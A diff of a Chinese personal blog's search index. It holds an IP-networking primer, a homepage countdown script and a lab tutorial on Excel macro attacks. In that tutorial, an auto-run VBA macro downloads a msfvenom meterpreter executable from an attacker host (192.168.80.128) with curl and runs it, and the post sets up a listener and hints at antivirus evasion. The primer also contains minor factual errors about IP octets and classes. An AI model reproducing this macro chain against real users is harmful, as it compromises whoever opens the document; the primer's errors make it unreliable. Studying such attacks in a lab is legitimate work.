@@ -543,6 +543,73 @@ SQL注入按照服务器返回信息是否显示分为报错注入和盲注。�
       </categories>
   </entry>
   <entry>
+    <title>IP地址详解</title>
+    <url>/2022/03/17/cgrona1/</url>
+    <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
+<p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x02 子网掩码</h1>
+<ol>
+<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
+<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
+<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
+</ol>
+<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x03 IP地址详解</h1>
+<p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
+<ul>
+<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
+<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
+<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
+<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
+<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
+</ul>
+<p>注：</p>
+<p>1、目前我们可以使用的只有A、B、C 三类</p>
+<p>2、A、B、C 三类的子网掩码可以修改</p>
+<h2 id="3-1-127开头">3.1 127开头</h2>
+<p>这个开头只有一个地址：**127.0.0.1：**本地回环地址（永远代表自己）</p>
+<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
+<h2 id="3-2-广播地址">3.2 广播地址</h2>
+<p>主机位上全为255即为广播地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x04 网关</h1>
+<p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
+<p>通俗来讲就是访问互联网的通道</p>
+<p>路由器：可用连接内外网的设备</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x05 DNS</h1>
+<p>DNS：Domain Name Service 域名服务</p>
+<p>用于<strong>解析网站域名</strong></p>
+<p>通过浏览器使用域名访问互联网：</p>
+<ul>
+<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
+<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
+<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
+</ul>
+<p>若直接访问 IP 地址的话则不需要DNS服务</p>
+<p>通过命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
+<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
+<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
+<h1>0x06 网络测试命令</h1>
+<ul>
+<li>
+<p>如何查看IP地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li>
+<p>测试网络连通性</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>转载</category>
+      </categories>
+  </entry>
+  <entry>
     <title>VulnHub——DC-1靶机学习记录</title>
     <url>/2022/09/24/dc1/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
@@ -940,71 +1007,38 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>IP地址详解</title>
-    <url>/2022/03/17/cgrona1/</url>
-    <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
-<p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x02 子网掩码</h1>
+    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
+    <url>/2023/04/14/indexcode/</url>
+    <content><![CDATA[<h1>网站模板</h1>
+<p>我的主页<a href="https://anineg.space/">ANINEGの小屋</a>模板是使用的来自<a href="https://html5up.net/">https://html5up.net</a>的免费模板，以下是网页的介绍：</p>
+<ul>
+<li>Fully <strong>Responsive</strong></li>
+<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
+<li>Super <strong>Customizable</strong></li>
+<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
+</ul>
+<p>有需要的同学们可以去自行下载。</p>
+<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
+<h1>源码修改</h1>
+<p>在原有模板的基础上，我增添了如下功能：</p>
 <ol>
-<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
-<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
-<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
+<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
+<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
+<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
 </ol>
-<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x03 IP地址详解</h1>
-<p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
-<ul>
-<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
-<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
-<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
-<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
-<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
-</ul>
-<p>注：</p>
-<p>1、目前我们可以使用的只有A、B、C 三类</p>
-<p>2、A、B、C 三类的子网掩码可以修改</p>
-<h2 id="3-1-127开头">3.1 127开头</h2>
-<p>这个开头只有一个地址：**127.0.0.1：**本地回环地址（永远代表自己）</p>
-<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
-<h2 id="3-2-广播地址">3.2 广播地址</h2>
-<p>主机位上全为255即为广播地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x04 网关</h1>
-<p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
-<p>通俗来讲就是访问互联网的通道</p>
-<p>路由器：可用连接内外网的设备</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
-<h1>0x05 DNS</h1>
-<p>DNS：Domain Name Service 域名服务</p>
-<p>用于<strong>解析网站域名</strong></p>
-<p>通过浏览器使用域名访问互联网：</p>
-<ul>
-<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
-<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
-<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
-</ul>
-<p>若直接访问 IP 地址的话则不需要DNS服务</p>
-<p>通过命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
-<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
-<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
-<h1>0x06 网络测试命令</h1>
-<ul>
-<li>
-<p>如何查看IP地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li>
-<p>测试网络连通性</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ul>
+<p>以下是实现过程：</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
+<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
+<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
+<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
 ]]></content>
       <categories>
-        <category>转载</category>
+        <category>随手记</category>
       </categories>
+      <tags>
+        <tag>源码</tag>
+      </tags>
   </entry>
   <entry>
     <title>某神奇社团的招新视频~</title>
@@ -1040,37 +1074,59 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
-    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
-    <url>/2023/04/14/indexcode/</url>
-    <content><![CDATA[<h1>网站模板</h1>
-<p>我的主页<a href="https://anineg.space/">ANINEGの小屋</a>模板是使用的来自<a href="https://html5up.net/">https://html5up.net</a>的免费模板，以下是网页的介绍：</p>
-<ul>
-<li>Fully <strong>Responsive</strong></li>
-<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
-<li>Super <strong>Customizable</strong></li>
-<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
-</ul>
-<p>有需要的同学们可以去自行下载。</p>
-<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
-<h1>源码修改</h1>
-<p>在原有模板的基础上，我增添了如下功能：</p>
-<ol>
-<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
-<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
-<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
-</ol>
-<p>以下是实现过程：</p>
-<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
-<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
-<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
-<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
-<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
+    <title>反弹Shell:通过Excel表格进行远控</title>
+    <url>/2023/04/02/officevba/</url>
+    <content><![CDATA[<h1>讲在前面</h1>
+<p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<s>再加上亿点点的划水</s>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
+<hr>
+<h1>什么是宏？</h1>
+<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>
+<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。</p>
+<h1>如何利用？</h1>
+<p>我们创建一个启用宏的excel表格，例如<code>值日名单.xlsm</code>。</p>
+<p>点击<code>视图</code>-<code>宏</code>-<code>查看宏</code>，在这里创建一个<code>AutoOpen</code></p>
+<p><img src="https://img.anineg.space/vba2.png" alt=""></p>
+<h2 id="1-弹出计算器">1.弹出计算器</h2>
+<p>在弹出的VBA中，修改为如下代码，点击运行，即可弹出计算器。</p>
+<p><img src="https://img.anineg.space/vba4-1.png" alt=""></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    LaunchCalculator</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub LaunchCalculator()</span><br><span class="line">    Shell "calc"</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p>原理其实就是在shell中输入<code>calc</code>，启动计算器。</p>
+<h3 id="启动Excel时自动执行">启动Excel时自动执行</h3>
+<p>在左侧<code>ThisWorkbook</code>中添加如下代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Private Sub Workbook_Open()</span><br><span class="line">    Call AutoOpen</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img.anineg.space/vba5.png" alt=""></p>
+<p>可以令excel在启动时自动运行<code>AutoOpen</code></p>
+<h2 id="2-浏览器全屏访问指定网页">2.浏览器全屏访问指定网页</h2>
+<p>以火狐浏览器为例：</p>
+<p>代码如下，其中</p>
+<p><code>firefoxPath</code>是指火狐浏览器的安装路径。</p>
+<p><code>websiteURL</code>是指要打开的网页。</p>
+<p><code>--kiosk</code>是指定浏览器全屏模式启动，也可以修改为<code>-url</code>以普通模式启动。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    OpenWeb</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub OpenWeb()</span><br><span class="line">    Dim firefoxPath As String</span><br><span class="line">    Dim websiteURL As String</span><br><span class="line">    </span><br><span class="line">    firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"</span><br><span class="line">    websiteURL = "https://anineg.space/"</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Call Shell(firefoxPath &amp; " --kiosk " &amp; websiteURL, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="3-利用反弹shell控制">3.利用反弹shell控制</h2>
+<p>在KALI（IP:192.168.80.128） 中生成<code>nc.exe</code>，具体过程不再详细叙述，给出命令行如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
+<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
+<p>回到Excel中，修改代码如下：</p>
+<p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p>与此同时，在KALI上需要开启监听：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
+<p>这样，当Excel表格在启动时就会自动连接至攻击机，渗透完成。</p>
+<p><img src="https://img.anineg.space/vba6.png" alt=""></p>
+<p>当然，对<code>nc.exe</code>做一下免杀效果会更好，如果以后有机会我会在这里继续更新一下，</p>
+<hr>
+<p>本测试仅作学习原理探究，严禁去做违法的事情！</p>
 ]]></content>
       <categories>
-        <category>随手记</category>
+        <category>学习笔记</category>
       </categories>
       <tags>
-        <tag>源码</tag>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+        <tag>分享会</tag>
       </tags>
   </entry>
   <entry>
@@ -1130,114 +1186,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </categories>
   </entry>
   <entry>
-    <title>反弹Shell:通过Excel表格进行远控</title>
-    <url>/2023/04/02/officevba/</url>
-    <content><![CDATA[<h1>讲在前面</h1>
